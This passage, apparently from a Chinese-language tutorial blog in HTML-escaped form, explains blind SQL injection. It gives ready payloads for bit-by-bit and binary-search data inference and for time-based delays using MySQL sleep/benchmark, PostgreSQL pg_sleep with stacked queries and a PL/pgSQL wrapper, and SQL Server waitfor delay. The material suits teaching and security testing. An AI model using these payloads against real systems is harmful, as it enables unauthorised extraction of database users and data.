number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- (False)&lt;/span&gt;
Incubating&lt;span class=&#34;token string&#34;&gt;&#39;
AND ASCII (SUBSTRING (SYSTEM USER, 1,1))
&amp;amp; 2=2-- (True)
Incubating&#39;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SYSTEM &lt;span class=&#34;token keyword&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- (True)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;-- ture代表1，false代表0，比对出得到01110011，十进制115，字母s&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;非主流通道技术&#34;&gt;&lt;a href=&#34;#非主流通道技术&#34; class=&#34;headerlink&#34; title=&#34;非主流通道技术&#34;&gt;&lt;/a&gt;非主流通道技术&lt;/h5&gt;&lt;p&gt;用的传输通道而非页面响应，它的传输通道包括DNS、e-mail和HTTP请求。非主流通道技术更重要的特点是：它们通常支持一次检索多块数据，而不是推断单个位或单个字节的值。&lt;/p&gt;
&lt;h3 id=&#34;使用基于时间技术&#34;&gt;&lt;a href=&#34;#使用基于时间技术&#34; class=&#34;headerlink&#34; title=&#34;使用基于时间技术&#34;&gt;&lt;/a&gt;使用基于时间技术&lt;/h3&gt;&lt;p&gt;发出请求到响应到达这段时间的差异。当某一状态为真时，如果能够让响应暂停几秒钟， 而当状态为假时，能够不出现暂停&lt;/p&gt;
&lt;h4 id=&#34;延迟数据库查询&#34;&gt;&lt;a href=&#34;#延迟数据库查询&#34; class=&#34;headerlink&#34; title=&#34;延迟数据库查询&#34;&gt;&lt;/a&gt;延迟数据库查询&lt;/h4&gt;&lt;h5 id=&#34;Mysql延迟&#34;&gt;&lt;a href=&#34;#Mysql延迟&#34; class=&#34;headerlink&#34; title=&#34;Mysql延迟&#34;&gt;&lt;/a&gt;Mysql延迟&lt;/h5&gt;&lt;p&gt; 两个函数，sleep()，benchmark(n,expression)&lt;/p&gt;
&lt;p&gt;sleep(N)强制延迟N秒&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;xxx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php?canshu&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select if(substring(user(),1,4)=&#39;&lt;/span&gt;root&#39;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;benchmark(N,expression)执行表达式expression N次，通常表达式为一个函数，这样能增加执行时间&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;xxx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php?canshu&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select if(substring(user(),1,4)=&#39;&lt;/span&gt;root&#39;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;benchmark&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100000000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;rand&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通常&lt;code&gt;&#39;root&#39;&lt;/code&gt;写成16进制0x726f6f74（只编码了root），只用可以去掉单引号&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;二分法&lt;/p&gt;
&lt;p&gt;依然是两种状态，延迟和未延迟&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&#39; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;……&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;k&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;SLEEP&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&#39; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;……&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;k&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;benchmark&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100000000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;rand&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;k是二分中间值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;逐位&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39; UNION SELECT IF (ASCII (SUBSTRING ((……), i, 1))&amp;amp;2^j =2^j,SLEEP(1), 1) # 
&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ASCII &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;……&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;BENCHMARK&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100000000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; RAND&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一部分注入在where字句中，这时延迟会在匹配表中每一行都会执行一次，时间会很长&lt;/p&gt;
&lt;h5 id=&#34;PostgreSQL延迟技术&#34;&gt;&lt;a href=&#34;#PostgreSQL延迟技术&#34; class=&#34;headerlink&#34; title=&#34;PostgreSQL延迟技术&#34;&gt;&lt;/a&gt;PostgreSQL延迟技术&lt;/h5&gt;&lt;p&gt;8.1或者更低的版本，使用系统库的sleep()函数创建一个函数&lt;/p&gt;
&lt;p&gt;8.2及更高的版本，不是用sleep，提供了一个函数&lt;code&gt;pg_sleep()&lt;/code&gt;，默认安装，返回值是void，不能直接放在where子句中&lt;/p&gt;
&lt;p&gt;解决方法，PostgreSQL能使用堆叠查询，第二个查询返回void，将由当前正在执行的应用程序进行处理，这会导致一个错误，当前程序将会失败，添加第三个哑查询，返回正确数量的列。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; pg_sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;另一种解决方法，如果拥有创建PL/pgSQL函数的权限，可以创建一个新函数来封装pg_sleep()，并使它的返回值不为void，这样就能替代pg_sleep()，数据库拥有者必须为每个数据库单独启用PL/pgSQL语言。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;LANGUAGE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;plpgsql&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- 启用PL/pgSQL&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 定义一个封装函数pause()&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FUNCTION&lt;/span&gt; pause&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;integer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;RETURNS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;integer&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; $$
&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt;
wait alias &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; $&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
PERFORM pg_sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;wait&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;RETURN&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
$$ &lt;span class=&#34;token keyword&#34;&gt;LANGUAGE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;plpgsql&#39;&lt;/span&gt; STRICT&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 调用&lt;/span&gt;
xxx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; usename &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; pg_user &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; usesuper &lt;span class=&#34;token operator&#34;&gt;IS&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;TRUE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;current_user&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;usename&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; PAUSE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ELSE&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;二分法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39;;SELECT CASE WHEN (ASCII (SUBSTR (..., i,1)) &amp;gt; k) THEN pg_sleep(1) END; SELECT NULL,...,NULL;-- 
&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTR&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; PAUSE &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ELSE&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;逐位&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39;;SELECT CASE WHEN (ASCII (SUBSTR (...,i,1)) &amp;amp;2^j=2^j) THEN pg_sleep(1) END; SELECT NULL,...,NULL;
&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ASCII &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTR&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; PAUSE &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ELSE&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;SQL-Server延迟&#34;&gt;&lt;a href=&#34;#SQL-Server延迟&#34; class=&#34;headerlink&#34; title=&#34;SQL Server延迟&#34;&gt;&lt;/a&gt;SQL Server延迟&lt;/h5&gt;&lt;p&gt;&lt;code&gt;waitfor delay &#39;00:01:00&#39;&lt;/code&gt;将正常执行时间增加1分钟，waitfor delay不能在where子句中使用，能使用堆叠查询&lt;/p&gt;
&lt;p&gt;SQL server驱动程序会把第一个查询输出返回给正在执行处理的程序，分号前面的会返回给后面的语句&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SYSTEM_USER&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token 